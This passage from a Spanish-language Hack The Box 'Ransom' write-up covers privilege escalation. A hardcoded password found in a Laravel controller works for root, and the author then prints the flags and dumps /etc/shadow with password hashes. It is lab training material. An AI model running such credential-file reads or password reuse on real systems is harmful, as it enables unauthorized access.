Warning: Permanently added '10.10.11.153' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jul  5 11:34:49 2021
htb@ransom:~$ whoami
htb
htb@ransom:~$
htb@ransom:~$ cat user.txt 
0c6d8595a2588f73973b8f453eca351b
htb@ransom:~$ 
```

## Escalada de privilegios

No vamos a explotar el `pkexec` por que no es la idea 

```bash
htb@ransom:/$ find \-perm -4000 2>/dev/null
./usr/bin/at
./usr/bin/fusermount
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/su
./usr/bin/mount
./usr/bin/umount
./usr/bin/chfn
./usr/bin/chsh
./usr/bin/gpasswd
./usr/bin/passwd
./usr/bin/pkexec
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
htb@ransom:/$
```

No tenemos la contraseña a si que no podemos ver nuestros privilegios a nivel de `sudoers`

```bash
htb@ransom:/$ sudo -l
[sudo] password for htb: 
htb@ransom:/$
```

Vemos que aquí hay un archivo de configuración de **apache2** y como tal nos esta dando otra ruta la cual es **DocumentRoot**

```bash
htb@ransom:/etc/apache2/sites-enabled$ cat  000-default.conf 
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /srv/prod/public

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	   <Directory /srv/prod/public>
	      Options +FollowSymlinks
	      AllowOverride All
	      Require all granted
	   </Directory>

</VirtualHost>
htb@ransom:/etc/apache2/sites-enabled$ ls -l /srv/prod/public
total 20
drwxr-xr-x 1 www-data www-data  106 Feb 17  2022 css
-rw-r--r-- 1 www-data www-data    0 Feb 17  2022 favicon.ico
drwxr-xr-x 1 www-data www-data   14 Feb 17  2022 fonts
-rwxr-xr-x 1 www-data www-data 1710 Feb 17  2022 index.php
drwxr-xr-x 1 www-data www-data  108 Feb 17  2022 js
-rw-r--r-- 1 www-data www-data   24 Feb 17  2022 robots.txt
drwxr-xr-x 1 www-data www-data   64 Feb 17  2022 scss
-rw-r--r-- 1 root     root     7735 Mar 15  2022 uploaded-file-3422.zip
lrwxrwxrwx 1 root     root       18 Mar  7  2022 user.txt -> /home/htb/user.txt
htb@ransom:/etc/apache2/sites-enabled$ 
```

Si vamos un directorio hacia atrás aquí vemos mucho mas archivos de configuración

```bash
htb@ransom:/etc/apache2/sites-enabled$ ls -l /srv/prod/
total 312
-rw-r--r-- 1 www-data www-data   3958 Feb 17  2022 README.md
drwxr-xr-x 1 www-data www-data     72 Feb 17  2022 app
-rwxr-xr-x 1 www-data www-data   1686 Feb 17  2022 artisan
drwxr-xr-x 1 www-data www-data     24 Feb 17  2022 bootstrap
-rw-r--r-- 1 www-data www-data   1745 Feb 17  2022 composer.json
-rw-r--r-- 1 www-data www-data 289854 Feb 17  2022 composer.lock
drwxr-xr-x 1 www-data www-data    312 Feb 17  2022 config
drwxr-xr-x 1 www-data www-data     72 Feb 17  2022 database
-rw-r--r-- 1 www-data www-data    473 Feb 17  2022 package.json
-rw-r--r-- 1 www-data www-data   1202 Feb 17  2022 phpunit.xml
drwxr-xr-x 1 www-data www-data    166 Mar 15  2022 public
drwxr-xr-x 1 www-data www-data     28 Feb 17  2022 resources
drwxr-xr-x 1 www-data www-data     74 Mar  7  2022 routes
-rw-r--r-- 1 www-data www-data    563 Feb 17  2022 server.php
drwxr-xr-x 1 www-data www-data     32 Feb 17  2022 storage
drwxr-xr-x 1 www-data www-data     90 Feb 17  2022 tests
drwxr-xr-x 1 www-data www-data    642 Feb 17  2022 vendor
-rw-r--r-- 1 www-data www-data    559 Feb 17  2022 webpack.mix.js
htb@ransom:/etc/apache2/sites-enabled$ 
```

Bueno hay muchos archivos de configuración  pero como tal los mas interesante puede ser la carpeta **public** y **app** si encontramos en la ruta **app** y después **HTTP** y **Controllers** y vemos que hay unos archivos interesantes

```bash
htb@ransom:/srv/prod/app/Http/Controllers$ ls
AuthController.php  Controller.php  TasksController.php
htb@ransom:/srv/prod/app/Http/Controllers$ 
```

Bueno si hacemos un **cat** a **AuthController.php** vemos que encontramos credenciales y el archivo de configuración el cual valida que la contraseña sea `UHC-March-Global-PW!` mediante una petición por el método **GET**

```bash
htb@ransom:/srv/prod/app/Http/Controllers$ cat AuthController.php 
<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use App\Http\Requests\RegisterRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;



class AuthController extends Controller
{
    /**
     * Display login page.
     * 
     * @return \Illuminate\Http\Response
     */
    public function show_login()
    {
        return view('auth.login');
    }



    /**
     * Handle account login
     * 
     */
    public function customLogin(Request $request)
    {
        $request->validate([
            'password' => 'required',
        ]);

        if ($request->get('password') == "UHC-March-Global-PW!") {
            session(['loggedin' => True]);
            return "Login Successful";
        }
  
        return "Invalid Password";
    }

}
htb@ransom:/srv/prod/app/Http/Controllers$ 
```

## Shell as root 

Bueno si probamos la contraseña para el usuario **root** funciona 

```bash
root@ransom:/srv/prod/app/Http/Controllers# whoami
root
root@ransom:/srv/prod/app/Http/Controllers# id
uid=0(root) gid=0(root) groups=0(root)
root@ransom:/srv/prod/app/Http/Controllers# 
```

## Root flag 

```bash
root@ransom:/srv/prod/app/Http/Controllers# cat /root/root.txt 
e84099d2b7b7a25edb0368a7dcace1f3
root@ransom:/srv/prod/app/Http/Controllers# 
```

```bash
root@ransom:/srv/prod/app/Http/Controllers# cat /etc/shadow
root:$6$E5UCDMdxavUAms42$rcELYDJwquNhCtTnF92RHyvcnYpw.kXlMl1XVCTNLorcbP.2WXt4i3KXsiVvEFLJ6ydRWVVg9AJ5kk3w9ufNZ/:19058:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
lp:*:18474:0:99999:7:::
mail:*:18474:0:99999:7:::
news:*:18474:0:99999:7:::
uucp:*:18474:0:99999:7:::
proxy:*:18474:0:99999:7:::
www-data:*:18474:0:99999:7:::
backup:*:18474:0:99999:7:::
list:*:18474:0:99999:7:::
irc:*:18474:0:99999:7:::
gnats:*:18474:0:99999:7:::
nobody:*:18474:0:99999:7:::
systemd-network:*:18474:0:99999:7:::
systemd-resolve:*:18474:0:99999:7:::
systemd-timesync:*:18474:0:99999:7:::
messagebus:*:18474:0:99999:7:::
syslog:*:18474:0:99999:7:::
_apt:*:18474:0:99999:7:::
tss:*:18474:0:99999:7:::
uuidd:*:18474:0:99999:7:::
tcpdump:*:18474:0:99999:7:::
pollinate:*:18474:0:99999:7:::
usbmux:*:18810:0:99999:7:::
sshd:*:18810:0:99999:7:::
systemd-coredump:!!:18810::::::
htb:$6$J1oJntrRf5vacLpi$RtbH.NzEX83qKgA8pRcxa8cxiRdzzcvUYoeu4sJnjeKXbeLZGDYL8k2wzBcCbKg2ygZU6N4TitTt87tS98zN4.:19058:0:99999:7:::
lxd:!:18810::::::
root@ransom:/srv/prod/app/Http/Controllers# 
```
